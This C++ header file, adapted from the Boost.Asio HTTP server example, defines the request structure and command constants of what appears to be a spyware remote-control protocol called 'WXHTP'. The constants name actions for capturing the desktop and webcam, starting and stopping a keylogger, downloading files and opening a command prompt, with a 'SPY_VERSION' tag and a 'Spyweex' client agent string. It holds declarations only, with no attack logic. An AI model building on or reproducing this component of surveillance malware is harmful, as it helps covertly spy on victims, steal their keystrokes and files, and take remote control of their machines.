//
// request.hpp
// ~~~~~~~~~~~
//
// Copyright (c) 2003-2015 Christopher M. Kohlhoff (chris at kohlhoff dot com)
//
// Distributed under the Boost Software License, Version 1.0. (See accompanying
// file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
//

#ifndef HTTP_REQUEST_HPP
#define HTTP_REQUEST_HPP

#include <string>
#include <vector>
#include <map>
#include "header.hpp"

namespace http {
	namespace server {		
		/// A request received from a client.
		struct request
		{
		  std::string method;
		  std::string action_type;
		  int wxhtp_version_major;
		  int wxhtp_version_minor;
		  std::vector<header> headers;
		  std::map<std::string, std::string> dictionary_headers;
		  std::string content;
		};

		namespace wxhtpconstants
		{
			namespace METHOD_TYPE
			{
				const char GET[] = "GET";
				const char POST[] = "POST";
			}

			namespace ACTION_TYPE
			{
				const char TAKE_DESKTOP_SCREEN[] = "/ACTION=TAKE_DESKTOP_SCREEN";
				const char TAKE_WEBCAM_SCREEN[] = "/ACTION=TAKE_WEBCAM_SCREEN";
				const char KEYLOGGER_START[] = "/ACTION=KEYLOGGER_START";
				const char KEYLOGGER_STOP[] = "/ACTION=KEYLOGGER_STOP";
				const char DOWNLOAD_FILE[] = "/ACTION=DOWNLOAD_FILE";
				const char COMMAND_PROMPT[] = "/ACTION=COMMAND_PROMPT";
			}

			namespace HEADER_TYPES
			{
				const char HOST[] = "Host:";
				const char TAG[] = "Tag:";
				const char USER_AGENT[] = "User-Agent:";
				const char CONTENT_TYPE[] = "Content-type:";
				const char CONTENT_LENGTH[] = "Content-Length:";
			}

			namespace DELIMITITERS
			{
				const char DOUBLE_NEWLINE[] = "\r\n\r\n";
				const char NEWLINE[] = "\r\n";
				const char SPACE = ' ';
				const char DOUBLE_PERCENT[] = "%%";
			}

			namespace VERSION
			{
				const char SPY_VERSION[] = "WXHTP/1.1";
				const char STANDARD_AGENT[] = "Spyweex-client-sharp";
			}
		}
	} // namespace server
} // namespace http

#endif // HTTP_REQUEST_HPP